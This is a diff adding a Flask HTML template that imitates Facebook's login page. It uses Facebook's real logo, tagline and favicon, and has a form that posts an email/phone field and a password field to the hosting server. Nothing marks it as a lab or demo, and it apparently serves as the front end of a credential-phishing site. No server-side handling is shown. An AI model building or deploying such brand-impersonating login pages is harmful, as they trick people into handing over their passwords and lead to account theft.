@@ -1,0 +1,35 @@
+<!-- OM Namah Shivay -->
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook Login</title>
+        <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+        <link rel="shortcut icon" href="{{ url_for('static', filename='images/fb.ico') }}" type="image/x-icon">
+        <title></title>
+    </head>
+    <body>
+        <div class="wrapper">
+            <div class="info">
+                <figure>
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook icon" class="logo">
+                </figure>
+                <p class="para">Facebook helps you connect and share with the people in your life.</p>
+            </div>
+            <div class="form">
+                <form method="POST"> 
+                <div class="loginform">
+                    <input class="input" type="text" name="login" placeholder="Email address or phone number">
+                    <input class="input" type="password" name="password" placeholder="Password">
+                    <input class="login" type="submit" value="Log in">
+                </form>       
+                </div>
+                <a href="#" class="fpass">Forgotten password?</a>
+                <hr>
+                <input type="button" value="Create new account" class="newacc">
+            </div>
+        </div>
+    </body>
+</html>
